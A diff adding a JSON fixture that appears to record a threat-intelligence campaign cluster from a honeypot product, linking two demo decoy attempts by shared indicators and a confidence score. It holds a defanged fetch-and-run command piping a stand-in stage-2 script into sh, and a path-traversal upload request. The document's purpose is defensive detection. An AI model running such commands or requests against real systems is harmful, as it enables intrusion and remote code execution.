@@ -1,0 +1,450 @@
+{
+  "campaign_id": "cmp_b61ebed681d410ce4b3d19fb",
+  "tenant_id": "t1",
+  "tenant_scope": "tenant",
+  "title": "Stage-2 URL hxxp://stage2[.]example[.]invalid/m.sh on 2 decoys",
+  "status": "emerging",
+  "first_seen": 1792288923000,
+  "last_seen": 1792290724100,
+  "seed": {
+    "attempt_id": "att_0e2effa1697050a0be41765f",
+    "features": [
+      "stage2_url",
+      "callback_domain",
+      "callback_ip",
+      "behaviour_fingerprint",
+      "cmdline",
+      "asn_cve",
+      "asn_techniques",
+      "request_shape"
+    ]
+  },
+  "attempt_ids": [
+    "att_0e2effa1697050a0be41765f",
+    "att_6b578aee5d058370fb9c6e44"
+  ],
+  "decoy_ids": [
+    "dcy-demo-1",
+    "dcy-demo-2"
+  ],
+  "sensor_ids": [],
+  "catalogue_ids": [
+    "foiled/demo-app/1.0.0"
+  ],
+  "members": [
+    {
+      "attempt_id": "att_0e2effa1697050a0be41765f",
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "sensor_id": null,
+      "src": "192.0.2.10",
+      "first_seen": 1792288923000,
+      "last_seen": 1792288924100,
+      "state": "post-exploitation",
+      "noise_score": 10,
+      "joined_by": [
+        {
+          "signal_id": "campaign:stage2_url:d1367092008c",
+          "feature": "stage2_url",
+          "families": [
+            "infrastructure"
+          ],
+          "strength": "strong",
+          "weight": 100,
+          "display": "hxxp://stage2[.]example[.]invalid/m.sh",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44",
+          "ioc_id": "ioc_2a326d8ccdd822cfbc1adc2c"
+        },
+        {
+          "signal_id": "campaign:callback_domain:a33fab5a4466",
+          "feature": "callback_domain",
+          "families": [
+            "infrastructure"
+          ],
+          "strength": "strong",
+          "weight": 100,
+          "display": "stage2[.]example[.]invalid",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44",
+          "ioc_id": "ioc_daf259e5ed85436b18bb7a11"
+        },
+        {
+          "signal_id": "campaign:callback_ip:9dc060e2b96c",
+          "feature": "callback_ip",
+          "families": [
+            "infrastructure"
+          ],
+          "strength": "strong",
+          "weight": 100,
+          "display": "192[.]0[.]2[.]80",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44",
+          "ioc_id": "ioc_8a63c09854314685b5ec5f02"
+        },
+        {
+          "signal_id": "campaign:behaviour_fingerprint:7a168682108e",
+          "feature": "behaviour_fingerprint",
+          "families": [
+            "ttp"
+          ],
+          "strength": "medium",
+          "weight": 70,
+          "display": "bf1:121466c817833a1300d6dbfce7b558ac",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44",
+          "ioc_id": "ioc_7a168682108eaf31158071a8"
+        },
+        {
+          "signal_id": "campaign:cmdline:e1b6ef4d11ff",
+          "feature": "cmdline",
+          "families": [
+            "ttp"
+          ],
+          "strength": "medium",
+          "weight": 70,
+          "display": "sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44",
+          "ioc_id": "ioc_e1b6ef4d11ffdcc323747f8c"
+        },
+        {
+          "signal_id": "campaign:asn_cve:c15f91c79acf",
+          "feature": "asn_cve",
+          "families": [
+            "infrastructure",
+            "targeting"
+          ],
+          "strength": "weak",
+          "weight": 40,
+          "display": "AS64500 and FOILED-DEMO-0001",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44"
+        },
+        {
+          "signal_id": "campaign:asn_techniques:b7d142c3679b",
+          "feature": "asn_techniques",
+          "families": [
+            "infrastructure",
+            "ttp"
+          ],
+          "strength": "weak",
+          "weight": 40,
+          "display": "AS64500 and T1059.004,T1105,T1190",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44"
+        },
+        {
+          "signal_id": "campaign:request_shape:14540fc4a3ab",
+          "feature": "request_shape",
+          "families": [
+            "payload"
+          ],
+          "strength": "weak",
+          "weight": 40,
+          "display": "/api/upload?path=../../../dev/shm/.m with demo-loader/0.2",
+          "with_attempt_id": "att_6b578aee5d058370fb9c6e44"
+        }
+      ]
+    },
+    {
+      "attempt_id": "att_6b578aee5d058370fb9c6e44",
+      "decoy_id": "dcy-demo-2",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "sensor_id": null,
+      "src": "192.0.2.11",
+      "first_seen": 1792290723000,
+      "last_seen": 1792290724100,
+      "state": "post-exploitation",
+      "noise_score": 10,
+      "joined_by": [
+        {
+          "signal_id": "campaign:stage2_url:d1367092008c",
+          "feature": "stage2_url",
+          "families": [
+            "infrastructure"
+          ],
+          "strength": "strong",
+          "weight": 100,
+          "display": "hxxp://stage2[.]example[.]invalid/m.sh",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f",
+          "ioc_id": "ioc_2a326d8ccdd822cfbc1adc2c"
+        },
+        {
+          "signal_id": "campaign:callback_domain:a33fab5a4466",
+          "feature": "callback_domain",
+          "families": [
+            "infrastructure"
+          ],
+          "strength": "strong",
+          "weight": 100,
+          "display": "stage2[.]example[.]invalid",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f",
+          "ioc_id": "ioc_daf259e5ed85436b18bb7a11"
+        },
+        {
+          "signal_id": "campaign:callback_ip:9dc060e2b96c",
+          "feature": "callback_ip",
+          "families": [
+            "infrastructure"
+          ],
+          "strength": "strong",
+          "weight": 100,
+          "display": "192[.]0[.]2[.]80",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f",
+          "ioc_id": "ioc_8a63c09854314685b5ec5f02"
+        },
+        {
+          "signal_id": "campaign:behaviour_fingerprint:7a168682108e",
+          "feature": "behaviour_fingerprint",
+          "families": [
+            "ttp"
+          ],
+          "strength": "medium",
+          "weight": 70,
+          "display": "bf1:121466c817833a1300d6dbfce7b558ac",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f",
+          "ioc_id": "ioc_7a168682108eaf31158071a8"
+        },
+        {
+          "signal_id": "campaign:cmdline:e1b6ef4d11ff",
+          "feature": "cmdline",
+          "families": [
+            "ttp"
+          ],
+          "strength": "medium",
+          "weight": 70,
+          "display": "sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f",
+          "ioc_id": "ioc_e1b6ef4d11ffdcc323747f8c"
+        },
+        {
+          "signal_id": "campaign:asn_cve:c15f91c79acf",
+          "feature": "asn_cve",
+          "families": [
+            "infrastructure",
+            "targeting"
+          ],
+          "strength": "weak",
+          "weight": 40,
+          "display": "AS64500 and FOILED-DEMO-0001",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f"
+        },
+        {
+          "signal_id": "campaign:asn_techniques:b7d142c3679b",
+          "feature": "asn_techniques",
+          "families": [
+            "infrastructure",
+            "ttp"
+          ],
+          "strength": "weak",
+          "weight": 40,
+          "display": "AS64500 and T1059.004,T1105,T1190",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f"
+        },
+        {
+          "signal_id": "campaign:request_shape:14540fc4a3ab",
+          "feature": "request_shape",
+          "families": [
+            "payload"
+          ],
+          "strength": "weak",
+          "weight": 40,
+          "display": "/api/upload?path=../../../dev/shm/.m with demo-loader/0.2",
+          "with_attempt_id": "att_0e2effa1697050a0be41765f"
+        }
+      ]
+    }
+  ],
+  "feature_summary": {
+    "infrastructure": {
+      "src_ips": {
+        "count": 2,
+        "values": [
+          "192[.]0[.]2[.]10",
+          "192[.]0[.]2[.]11"
+        ]
+      },
+      "asns": [
+        64500
+      ],
+      "stage2_urls": {
+        "count": 1,
+        "values": [
+          "hxxp://stage2[.]example[.]invalid/m.sh"
+        ]
+      },
+      "callback_domains": {
+        "count": 1,
+        "values": [
+          "stage2[.]example[.]invalid"
+        ]
+      },
+      "callback_ips": {
+        "count": 1,
+        "values": [
+          "192[.]0[.]2[.]80"
+        ]
+      }
+    },
+    "ttp": {
+      "techniques": [
+        "T1059.004",
+        "T1105",
+        "T1190"
+      ],
+      "behaviour_fingerprints": {
+        "count": 1,
+        "values": [
+          "bf1:121466c817833a1300d6dbfce7b558ac"
+        ]
+      },
+      "cmdlines": {
+        "count": 1,
+        "values": [
+          "sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'"
+        ]
+      }
+    },
+    "targeting": {
+      "pattern": "selective",
+      "attempts": 2,
+      "sources": 2,
+      "decoys_touched": 2,
+      "sensors_touched": 0,
+      "products_touched": 1,
+      "visible_decoys": 6,
+      "coverage_pct": 33,
+      "noise_bands": {
+        "targeted": 2,
+        "mixed": 0,
+        "mass": 0,
+        "unknown": 0
+      },
+      "catalogue_ids": [
+        "foiled/demo-app/1.0.0"
+      ],
+      "cves": [
+        "FOILED-DEMO-0001"
+      ],
+      "advisory_timing": [
+        {
+          "cve_id": "FOILED-DEMO-0001",
+          "published_at": 1792800000000,
+          "first_seen": 1792288923000,
+          "offset_hours": -142,
+          "before_disclosure": true
+        }
+      ],
+      "evidence": [
+        "touched 2 of 6 visible decoy(s) running the same products (33%)",
+        "left most visible decoys of the same products alone",
+        "first attempt on FOILED-DEMO-0001 came 142 hour(s) before its advisory"
+      ]
+    },
+    "payload": {
+      "payload_sha256": {
+        "count": 0,
+        "values": []
+      },
+      "file_sha256": {
+        "count": 0,
+        "values": []
+      },
+      "request_substrings": {
+        "count": 0,
+        "values": []
+      },
+      "request_shapes": {
+        "count": 1,
+        "values": [
+          "/api/upload?path=../../../dev/shm/.m with demo-loader/0.2"
+        ]
+      }
+    }
+  },
+  "shared_ioc_ids": [
+    "ioc_2a326d8ccdd822cfbc1adc2c",
+    "ioc_7a168682108eaf31158071a8",
+    "ioc_8a63c09854314685b5ec5f02",
+    "ioc_8c5e85c488ba555c4cd816bc",
+    "ioc_daf259e5ed85436b18bb7a11",
+    "ioc_e1b6ef4d11ffdcc323747f8c",
+    "ioc_f05a1d4493587eb8d88c238b",
+    "ioc_f0b759f39d270c2848199404"
+  ],
+  "confidence_ref": "/v0/campaigns/cmp_b61ebed681d410ce4b3d19fb/evidence",
+  "confidence": {
+    "score": 53,
+    "band": "medium",
+    "wording": "possible",
+    "publishable": false,
+    "evidence": [
+      {
+        "signal_id": "campaign:stage2_url:d1367092008c",
+        "source": "campaign_cluster",
+        "weight": 100,
+        "summary": "2 attempts share stage-2 URL hxxp://stage2[.]example[.]invalid/m.sh",
+        "ref": "ioc_2a326d8ccdd822cfbc1adc2c"
+      },
+      {
+        "signal_id": "campaign:callback_domain:a33fab5a4466",
+        "source": "campaign_cluster",
+        "weight": 100,
+        "summary": "2 attempts share callback domain stage2[.]example[.]invalid",
+        "ref": "ioc_daf259e5ed85436b18bb7a11"
+      },
+      {
+        "signal_id": "campaign:callback_ip:9dc060e2b96c",
+        "source": "campaign_cluster",
+        "weight": 100,
+        "summary": "2 attempts share callback address 192[.]0[.]2[.]80",
+        "ref": "ioc_8a63c09854314685b5ec5f02"
+      },
+      {
+        "signal_id": "campaign:behaviour_fingerprint:7a168682108e",
+        "source": "campaign_cluster",
+        "weight": 70,
+        "summary": "2 attempts share behaviour fingerprint bf1:121466c817833a1300d6dbfce7b558ac",
+        "ref": "ioc_7a168682108eaf31158071a8"
+      },
+      {
+        "signal_id": "campaign:cmdline:e1b6ef4d11ff",
+        "source": "campaign_cluster",
+        "weight": 70,
+        "summary": "2 attempts share command line sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'",
+        "ref": "ioc_e1b6ef4d11ffdcc323747f8c"
+      },
+      {
+        "signal_id": "campaign:asn_cve:c15f91c79acf",
+        "source": "campaign_cluster",
+        "weight": 40,
+        "summary": "2 attempts share ASN and CVE AS64500 and FOILED-DEMO-0001"
+      },
+      {
+        "signal_id": "campaign:asn_techniques:b7d142c3679b",
+        "source": "campaign_cluster",
+        "weight": 40,
+        "summary": "2 attempts share ASN and technique set AS64500 and T1059.004,T1105,T1190"
+      },
+      {
+        "signal_id": "campaign:request_shape:14540fc4a3ab",
+        "source": "campaign_cluster",
+        "weight": 40,
+        "summary": "2 attempts share request shape /api/upload?path=../../../dev/shm/.m with demo-loader/0.2"
+      },
+      {
+        "signal_id": "campaign:noise:cmp_b61ebed681d410ce4b3d19fb",
+        "source": "noise_score",
+        "weight": 10,
+        "summary": "lowest member source noise score 10"
+      }
+    ],
+    "caps_applied": [
+      "CampaignCluster capped at 55 points"
+    ]
+  },
+  "suggested_actor_links": [],
+  "analyst": {
+    "title": null,
+    "status": null,
+    "feedback": null,
+    "merged_from": [],
+    "split_from": null,
+    "action_ids": []
+  },
+  "notes": []
+}
